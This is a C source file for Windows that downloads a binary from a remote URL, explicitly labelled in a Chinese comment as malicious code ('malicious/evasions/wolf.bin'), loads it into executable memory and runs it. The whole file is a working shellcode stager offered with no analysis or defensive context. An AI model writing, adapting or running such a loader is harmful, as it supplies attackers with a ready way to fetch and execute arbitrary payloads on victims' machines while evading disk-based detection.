#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment (lib, "wininet.lib")


void ExecutePayload(const char* url) {
    HINTERNET hInternet = InternetOpen("MyDownloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed.\n");
        return;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrl failed.\n");
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[4096];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    //动态分配内存
    char* payload = NULL;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload = (char*)realloc(payload, totalBytesRead + bytesRead);
        memcpy(payload + totalBytesRead, buffer, bytesRead);
        totalBytesRead += bytesRead;
    }

    //创建一个内存段来存储并执行下载的代码
    void* execMem = VirtualAlloc(NULL, totalBytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        printf("VirtualAlloc failed.\n");
        free(payload);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    memcpy(execMem, payload, totalBytesRead);
    ((void(*)())execMem)();

    //释放资源
    VirtualFree(execMem, 0, MEM_RELEASE);
    free(payload);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    const char* url = "http://192.168.0.189/malicious/evasions/wolf.bin";  //远程恶意代码的URL
    ExecutePayload(url);
    return 0;
}
